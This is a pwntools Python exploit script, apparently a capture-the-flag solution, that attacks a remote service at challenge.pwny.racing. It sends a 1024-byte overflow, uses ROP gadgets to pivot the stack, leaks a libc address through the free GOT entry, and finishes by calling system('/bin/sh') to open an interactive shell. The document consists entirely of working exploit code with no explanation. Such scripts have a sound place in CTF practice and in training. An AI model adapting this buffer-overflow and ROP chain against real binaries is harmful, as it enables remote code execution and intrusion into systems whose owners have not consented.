from pwn import *

context.update(arch='amd64', os='linux')
context.update(log_level='debug')

#s = remote('xenial', 31337)
s = remote('challenge.pwny.racing', 11533)

cave_top = 0x602e00
fprintf = 0x4008b0
sprintf = 0x400920
fopen = 0x400910
got_free = 0x601f70
main = 0x400c73
pop_rdi = 0x00400ed3
pop_rsi_r15 = 0x00400ed1
pcts = 0x004015cc
pop_rsp_3 = 0x00400ecd
# magic stack pivot
rop = flat([
    pop_rdi, cave_top,
    pop_rsi_r15, 0x400018, 0,
    sprintf,
    pop_rsp_3, cave_top - 24,
])

pause()
s.recvuntil('file: ')
s.send('a' * 1024)
s.send('\x18')
s.send(rop)
s.send('\n')

## ROUND TWO: rsp fixed
stdout = 0x602020
rop = flat([
    pop_rdi, 0x602d70,
    pop_rsi_r15, stdout, 0,
    sprintf,
    pop_rdi, 0x4141414141,
    pop_rsi_r15, got_free, 0,
    fprintf,
    pop_rdi, 0,
    pop_rsi_r15, 0, 0,
    main
])
s.recvuntil('file: ')
s.send('a' * 1024)
s.send('\x18')
s.send(rop)
s.send('\n')

s.recvline() # only on remote: stderr is redirected
libc_base = u64(s.recv(6).ljust(8, '\0')) - 0x97950
log.info("libc: %#x", libc_base)

## ROUND THREE: WIN
system = libc_base + 0x4f440
binsh = libc_base + 0x001b3e9a
nop = 0x00400b45
rop = flat([
    nop,
    pop_rdi, binsh,
    system
])
s.recvuntil('file: ')
s.send('a' * 1024)
s.send('\x18')
s.send(rop)
s.send('\n')

s.interactive()
